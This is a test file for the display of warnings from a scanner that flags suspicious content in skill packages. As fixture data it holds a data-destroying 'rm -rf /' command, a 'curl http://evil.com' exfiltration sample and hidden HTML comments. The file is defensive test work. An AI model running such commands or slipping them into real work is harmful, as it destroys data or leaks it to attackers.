import { describe, expect, test } from "bun:test";
import type { SemanticWarning, StaticWarning } from "@skilltap/core";
import { formatSemanticWarnings, formatWarnings, printSemanticWarnings, printWarnings } from "./scan";

describe("formatWarnings", () => {
  test("includes skill name in header", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 1,
        category: "HTML comment",
        raw: "<!-- hi -->",
      },
    ];
    const result = formatWarnings(warnings, "my-skill");
    expect(result).toContain("⚠ Static warnings in my-skill:");
  });

  test("shows line number prefix for positive line", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 14,
        category: "HTML comment",
        raw: "<!-- evil -->",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("L14: HTML comment");
  });

  test("shows line range for array line numbers", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: [5, 10] as [number, number],
        category: "Multi-line block",
        raw: "content",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("L5-10: Multi-line block");
  });

  test("uses file path when line is 0", () => {
    const warnings: StaticWarning[] = [
      {
        file: "binary.bin",
        line: 0,
        category: "Binary file",
        raw: "ELF binary",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("binary.bin: Binary file");
  });

  test("shows raw and visible when they differ", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 14,
        category: "Invisible Unicode",
        raw: "Before \u200btext",
        visible: "Before text",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain('│ Raw: "Before \u200btext"');
    expect(result).toContain('│ Visible: "Before text"');
  });

  test("shows only raw when visible is absent", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 8,
        category: "HTML comment",
        raw: "<!-- evil -->",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("│ <!-- evil -->");
    expect(result).not.toContain("Visible:");
  });

  test("shows only raw when visible matches raw", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 8,
        category: "Dangerous pattern",
        raw: "rm -rf /",
        visible: "rm -rf /",
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).not.toContain("Visible:");
  });

  test("handles multiple warnings", () => {
    const warnings: StaticWarning[] = [
      { file: "SKILL.md", line: 1, category: "Cat A", raw: "raw1" },
      { file: "SKILL.md", line: 2, category: "Cat B", raw: "raw2" },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("Cat A");
    expect(result).toContain("Cat B");
  });

  test("renders context lines when provided (startLine > 1)", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 5,
        category: "Dangerous pattern",
        raw: "danger",
        context: ["before line", "danger", "after line"],
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("danger");
    expect(result).toContain("before line");
    expect(result).toContain("after line");
    expect(result).toContain("│");
  });

  test("renders context lines when startLine is 1 (matchLineIdx=0)", () => {
    const warnings: StaticWarning[] = [
      {
        file: "SKILL.md",
        line: 1,
        category: "Dangerous pattern",
        raw: "line1",
        context: ["line1", "line2"],
      },
    ];
    const result = formatWarnings(warnings, "skill");
    expect(result).toContain("line1");
    expect(result).toContain("line2");
    expect(result).toContain("│");
  });
});

describe("printWarnings", () => {
  test("writes formatted warnings to stderr", () => {
    const chunks: string[] = [];
    const original = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk: string | Uint8Array) => {
      chunks.push(typeof chunk === "string" ? chunk : new TextDecoder().decode(chunk));
      return true;
    };
    try {
      const warnings: StaticWarning[] = [
        { file: "SKILL.md", line: 1, category: "HTML comment", raw: "<!-- x -->" },
      ];
      printWarnings(warnings, "my-skill");
      const output = chunks.join("");
      expect(output).toContain("⚠ Static warnings in my-skill:");
      expect(output).toContain("HTML comment");
    } finally {
      process.stderr.write = original;
    }
  });
});

describe("formatSemanticWarnings", () => {
  const makeWarning = (overrides?: Partial<SemanticWarning>): SemanticWarning => ({
    file: "SKILL.md",
    chunkIndex: 0,
    lineRange: [10, 15],
    score: 7,
    reason: "Suspicious exfiltration pattern",
    raw: "some content here",
    ...overrides,
  });

  test("includes skill name in header", () => {
    const result = formatSemanticWarnings([makeWarning()], "my-skill");
    expect(result).toContain("⚠ Semantic warnings in my-skill:");
  });

  test("shows line range and chunk index and score", () => {
    const result = formatSemanticWarnings([makeWarning()], "skill");
    expect(result).toContain("L10-15 (chunk 0) — risk 7/10");
  });

  test("shows reason", () => {
    const result = formatSemanticWarnings([makeWarning()], "skill");
    expect(result).toContain("→ Suspicious exfiltration pattern");
  });

  test("shows raw content as quoted lines (up to 3)", () => {
    const raw = "line one\nline two\nline three\nline four";
    const result = formatSemanticWarnings([makeWarning({ raw })], "skill");
    expect(result).toContain('"line one"');
    expect(result).toContain('"line two"');
    expect(result).toContain('"line three"');
    expect(result).not.toContain('"line four"');
  });

  test("handles multiple warnings", () => {
    const warnings = [makeWarning({ score: 3 }), makeWarning({ chunkIndex: 1, score: 9 })];
    const result = formatSemanticWarnings(warnings, "skill");
    expect(result).toContain("risk 3/10");
    expect(result).toContain("risk 9/10");
  });
});

describe("printSemanticWarnings", () => {
  test("writes formatted semantic warnings to stderr", () => {
    const chunks: string[] = [];
    const original = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk: string | Uint8Array) => {
      chunks.push(typeof chunk === "string" ? chunk : new TextDecoder().decode(chunk));
      return true;
    };
    try {
      const warnings: SemanticWarning[] = [
        {
          file: "SKILL.md",
          chunkIndex: 0,
          lineRange: [1, 5],
          score: 8,
          reason: "Data exfiltration",
          raw: "curl http://evil.com",
        },
      ];
      printSemanticWarnings(warnings, "my-skill");
      const output = chunks.join("");
      expect(output).toContain("⚠ Semantic warnings in my-skill:");
      expect(output).toContain("Data exfiltration");
    } finally {
      process.stderr.write = original;
    }
  });
});
